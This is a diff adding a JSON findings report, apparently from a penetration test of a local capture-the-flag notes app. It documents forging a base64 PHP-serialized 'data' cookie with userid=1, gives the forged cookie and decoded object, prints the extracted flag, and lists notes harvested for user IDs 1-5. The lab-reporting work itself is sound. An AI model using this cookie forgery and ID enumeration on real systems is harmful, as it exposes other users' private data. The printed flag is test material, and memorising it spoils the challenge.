@@ -1,0 +1,44 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:56:36.305707+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "af2b2170-bb82-4e81-8417-c19756c2a8e6",
+      "timestamp": "2026-04-13T11:56:36.305615+00:00",
+      "title": "PHP Insecure Deserialization + IDOR - CTF Flag Extraction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:60493",
+      "description": "The application stores session data in a client-side cookie named 'data' as a base64-encoded PHP serialized UserProfile object. By decoding the cookie, modifying the userid field (e.g., from 4 to 1), re-encoding, and sending the forged cookie, an attacker can access any user's notes without authentication. This combines Insecure Deserialization with IDOR (Broken Object Level Authorization).",
+      "evidence": "Forged cookie with userid=1: data=TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo3OiJoYWNrZXIyIjt9\nDecoded PHP object: O:11:\"UserProfile\":2:{s:6:\"userid\";i:1;s:8:\"username\";s:7:\"hacker2\";}\nAccessing /index.php with forged cookie reveals user 1's secret note:\nTitle: Flag\nContent: My Secret Flag FLAG{a68e6443c894f67f53c4db8f932273d21468c7acd52ee8e8a78357e88f3bccc5}",
+      "tool_used": "manual/curl",
+      "cve": ""
+    },
+    {
+      "id": "67337915-007b-4dc7-bbbe-00a352f62c59",
+      "timestamp": "2026-04-13T12:03:48.826996+00:00",
+      "title": "IDOR - Full Data Exposure Across All User Accounts via Cookie Manipulation",
+      "severity": "high",
+      "target": "http://172.17.0.1:60493",
+      "description": "The PHP serialized cookie IDOR vulnerability allows enumeration of all user notes across all user IDs. No authentication beyond the initial session cookie is required to access any user's private notes. An attacker can iterate over user IDs 1-N to harvest all notes from all users.",
+      "evidence": "UID=1 (admin): 2 notes including 'Flag' with content: FLAG{a68e6443c894f67f53c4db8f932273d21468c7acd52ee8e8a78357e88f3bccc5}\nUID=2: 1 note\nUID=3: 1 note (testuser)\nUID=4: 1 note (hacker2 own account)\nUID=5: 1 note\nAll notes accessed using forged data cookies with arbitrary userid values.",
+      "tool_used": "manual/curl",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "aa39bdcd-af51-438a-8ebd-0045fc8381a1",
+      "timestamp": "2026-04-13T11:56:50.566650+00:00",
+      "title": "Simple Notes App Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> SignIn[\"/sign-in.php\"]\n  Browser --> SignUp[\"/sign-up.php\"]\n  Browser --> Index[\"/index.php - Notes Dashboard\"]\n  Browser --> Logout[\"/logout.php\"]\n  SignIn -->|\"302 + data cookie\"| Index\n  Index -->|\"Add Note POST\"| Index\n  Index -->|\"Reads notes by userid\"| DB[\"MySQL/DB\"]\n  DataCookie[\"data cookie - base64 PHP serialize\"] -->|\"IDOR: forge userid\"| Index\n  SignUp --> DB\n  SignIn --> DB\n  Static[\"static/ - CSS/JS\"] --> Browser\n  Upload[\"upload/\"] --> Browser"
+    },
+    {
+      "id": "b1b5e56f-27f1-4804-988e-6d8fbde172da",
+      "timestamp": "2026-04-13T12:03:53.167744+00:00",
+      "title": "Post-Exploitation Data Exposure Map",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] -->|\"Forge data cookie userid=1\"| NoteDB[\"Notes Database\"]\n  NoteDB --> U1[\"UID=1 - Flag Note (CTF flag)\"]\n  NoteDB --> U2[\"UID=2 - User Note\"]\n  NoteDB --> U3[\"UID=3 - User Note\"]\n  NoteDB --> U4[\"UID=4 - hacker2 Note\"]\n  NoteDB --> U5[\"UID=5 - User Note\"]\n  CookieForge[\"PHP Serialize Forge\"] -->|\"base64 O:11:UserProfile:2...\"| Attacker"
+    }
+  ]
+}
